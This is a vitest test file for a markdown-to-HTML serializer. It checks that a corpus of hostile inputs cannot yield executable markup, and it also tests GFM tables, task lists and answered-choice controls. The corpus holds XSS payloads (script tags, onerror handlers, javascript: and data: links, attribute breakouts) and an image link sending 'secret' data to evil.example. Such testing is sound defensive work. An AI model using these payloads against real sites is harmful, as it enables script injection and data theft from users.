/** The hostile-payload corpus: markdown -> Node -> string may never yield executable markup. */

import { describe, expect, it } from 'vitest'
import { markdown } from '../src/markdown.ts'
import { SafeUrl } from '../src/node.ts'
import { serializeAll } from '../src/serialize.ts'

/**
 * Every tag this vocabulary can produce. Anything outside it in rendered output
 * means an escape was missed, so the corpus asserts on the tag set rather than
 * on substrings, which escaped text legitimately contains.
 */
const ALLOWED_TAG =
  /^<\/?(?:p|em|strong|del|li|ul|ol|blockquote|pre|code|a|h[1-6]|table|thead|tbody|tr|th|td|hr|br|div|label|input)(?: class="lang-[^"<>]*"| class="tablewrap"| class="a(?:left|center|right)"| class="pick" type="(?:checkbox|radio)"(?: checked)? disabled| class="other" value="[^"<>]*" placeholder="[^"<>]*" disabled| href="[^"<>]*" rel="noreferrer noopener")?>$/

/** Render markdown the way the transcript route does. */
function html(source: string): string {
  return serializeAll(markdown(source))
}

const HOSTILE: readonly string[] = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '<svg onload=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '[click](javascript:alert(1))',
  '[click](JaVaScRiPt:alert(1))',
  '[click](  javascript:alert(1))',
  '[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)',
  '[click](vbscript:msgbox(1))',
  '[x](https://ok.example/"onmouseover="alert(1))',
  '```\n</code></pre><script>alert(1)</script>\n```',
  '`</code><script>alert(1)</script>`',
  '**<script>alert(1)</script>**',
  '> <script>alert(1)</script>',
  '- <img src=x onerror=alert(1)>',
  '# <script>alert(1)</script>',
  'http://ok.example/<script>alert(1)</script>',
  '<a href="javascript:alert(1)">x</a>',
  '<style>body{display:none}</style>',
  '<base href="https://evil.example/">',
  '<form action="https://evil.example/"><input name=x></form>',
  '<!--><script>alert(1)</script>-->',
  '<math><mtext><script>alert(1)</script></mtext></math>',
  // GFM constructs carrying the same payloads: a table cell, a heading, a
  // strikethrough and a task item are new routes to the serializer, so each
  // one has to be proven to escape exactly like the older ones.
  '| a | b |\n| - | - |\n| <script>alert(1)</script> | x |',
  '| <img src=x onerror=alert(1)> |\n| - |\n| y |',
  '| a |\n| :-- |\n| [c](javascript:alert(1)) |',
  '| a | b |\n| --- | --- |\n| `</code><script>alert(1)</script>` | x |',
  '~~<script>alert(1)</script>~~',
  '- [x] <script>alert(1)</script>',
  '## <img src=x onerror=alert(1)>',
  '| a |\n| - |\n| </td></tr></table><script>alert(1)</script> |',
]

describe('serializer', () => {
  it.each(HOSTILE)('emits only vocabulary tags for %j', payload => {
    for (const tag of html(payload).match(/<[^>]*>/g) ?? []) {
      expect(tag).toMatch(ALLOWED_TAG)
    }
  })

  it.each(HOSTILE)('emits no event-handler attribute for %j', payload => {
    // Only a handler inside a real tag could ever run. Escaped text
    // legitimately contains the characters `onerror=` and is inert, so the
    // assertion looks at emitted tags rather than at the whole string.
    for (const tag of html(payload).match(/<[^>]*>/g) ?? []) {
      expect(tag).not.toMatch(/\son\w+=/i)
    }
  })

  it.each(HOSTILE)('puts no live href on a refused scheme for %j', payload => {
    for (const [, href] of html(payload).matchAll(/<a href="([^"]*)"/g)) {
      expect(() => SafeUrl(decode(href ?? ''))).not.toThrow()
    }
  })

  it('keeps a fenced block containing its own closing tag intact', () => {
    const output = html('```\n</code></pre>\n```')
    expect(output).toBe('<pre><code>&lt;/code&gt;&lt;/pre&gt;</code></pre>')
  })

  it('preserves fenced text exactly once decoded', () => {
    const body = 'if (a < b && c > d) { return "x" }'
    const output = html(`\`\`\`ts\n${body}\n\`\`\``)
    expect(output).toContain('class="lang-ts"')
    expect(decode(output)).toContain(body)
  })

  it('admits ordinary links and marks them noreferrer', () => {
    expect(html('[docs](https://example.com/a?b=1)')).toBe(
      '<p><a href="https://example.com/a?b=1" rel="noreferrer noopener">docs</a></p>',
    )
  })

  it('shows a refused href as readable text rather than dropping it', () => {
    const output = html('[click](javascript:alert(1))')
    expect(output).not.toContain('<a ')
    expect(decode(output)).toContain('javascript:alert(1)')
  })

  it('has no image variant, so nothing auto-fetches', () => {
    expect(html('![leak](https://evil.example/x.png?data=secret)')).not.toContain('<img')
  })

  it('refuses protocol-relative and unknown schemes at mint time', () => {
    expect(() => SafeUrl('//evil.example/x')).toThrow(TypeError)
    expect(() => SafeUrl('javascript:alert(1)')).toThrow(TypeError)
    expect(() => SafeUrl('data:text/html,x')).toThrow(TypeError)
    expect(() => SafeUrl('')).toThrow(TypeError)
  })

  it('renders a GFM table with a head, a body and aligned columns', () => {
    const output = html('| Name | Count |\n| :--- | ----: |\n| a | 1 |\n| b | 2 |')
    expect(output).toBe(
      '<div class="tablewrap"><table>'
      + '<thead><tr><th class="aleft">Name</th><th class="aright">Count</th></tr></thead>'
      + '<tbody><tr><td class="aleft">a</td><td class="aright">1</td></tr>'
      + '<tr><td class="aleft">b</td><td class="aright">2</td></tr></tbody>'
      + '</table></div>',
    )
  })

  it('leaves an unaligned column without an alignment class', () => {
    expect(html('| a |\n| --- |\n| 1 |')).toContain('<th>a</th>')
  })

  it('renders inline markup inside table cells', () => {
    const output = html('| a | b |\n| - | - |\n| **bold** | `mono` |')
    expect(output).toContain('<td><strong>bold</strong></td>')
    expect(output).toContain('<td><code>mono</code></td>')
  })

  it('pads a ragged row to the header width, as GFM requires', () => {
    expect(html('| a | b |\n| - | - |\n| 1 |')).toContain('<tbody><tr><td>1</td><td></td></tr></tbody>')
  })

  it('centres a column the delimiter row centres', () => {
    expect(html('| a |\n| :-: |\n| 1 |')).toContain('<th class="acenter">a</th>')
  })

  it('renders strikethrough as del', () => {
    expect(html('~~gone~~')).toBe('<p><del>gone</del></p>')
  })

  it('renders headings at their real level', () => {
    expect(html('# One')).toBe('<h1>One</h1>')
    expect(html('###### Six')).toBe('<h6>Six</h6>')
  })

  it('renders task list items as disabled checkboxes, drawn once each', () => {
    expect(html('- [x] done\n- [ ] todo')).toBe(
      '<ul><li><input class="pick" type="checkbox" checked disabled>done</li>'
      + '<li><input class="pick" type="checkbox" disabled>todo</li></ul>',
    )
  })

  it('renders a thematic break and a hard line break', () => {
    expect(html('---')).toBe('<hr>')
    expect(html('one  \ntwo')).toBe('<p>one<br>two</p>')
  })

  it('keeps nested lists nested', () => {
    expect(html('- a\n  - b')).toBe('<ul><li>a<ul><li>b</li></ul></li></ul>')
  })

  it('decodes entities exactly once, so the reader sees the character', () => {
    expect(decode(html('a &amp; b'))).toContain('a & b')
    expect(html('a &amp; b')).toContain('&amp;')
    expect(html('a &amp; b')).not.toContain('&amp;amp;')
  })

  it('admits the schemes a transcript needs', () => {
    expect(SafeUrl('https://a.example/x')).toBe('https://a.example/x')
    expect(SafeUrl('mailto:a@b.example')).toBe('mailto:a@b.example')
    expect(SafeUrl('/s/abc')).toBe('/s/abc')
  })

  // An answered question is drawn as the form the reader answered in, so its
  // two controls carry text from the model (the option labels) and from the
  // person (what they typed) into *attribute* position, which the markdown
  // corpus above never exercises.
  it('renders an answered choice as the disabled control it records', () => {
    expect(serializeAll([{ t: 'choice', multi: false, checked: true, s: 'Right' }]))
      .toBe('<label><input class="pick" type="radio" checked disabled>Right</label>')
    expect(serializeAll([{ t: 'choice', multi: true, checked: false, s: 'Left' }]))
      .toBe('<label><input class="pick" type="checkbox" disabled>Left</label>')
  })

  it('renders the free-text option as a disabled box holding what was typed', () => {
    expect(serializeAll([{ t: 'typed', multi: false, checked: true, s: 'Up', hint: 'Your answer' }]))
      .toBe('<label><input class="pick" type="radio" checked disabled>'
        + '<input class="other" value="Up" placeholder="Your answer" disabled></label>')
  })

  it('escapes an answer that tries to break out of its attribute', () => {
    const payload = '"><script>alert(1)</script><input x="'
    const output = serializeAll([
      { t: 'choice', multi: false, checked: true, s: payload },
      { t: 'typed', multi: false, checked: true, s: payload, hint: payload },
    ])
    expect(output).not.toContain('<script')
    for (const tag of output.match(/<[^>]*>/g) ?? []) expect(tag).toMatch(ALLOWED_TAG)
    // The text survives for the reader even though it cannot act.
    expect(decode(output)).toContain(payload)
  })
})

/** Decode the entities the serializer emits, to assert on the reader's view. */
function decode(value: string): string {
  return value
    .replaceAll('&lt;', '<').replaceAll('&gt;', '>')
    .replaceAll('&quot;', '"').replaceAll('&#39;', "'")
    .replaceAll('&amp;', '&')
}
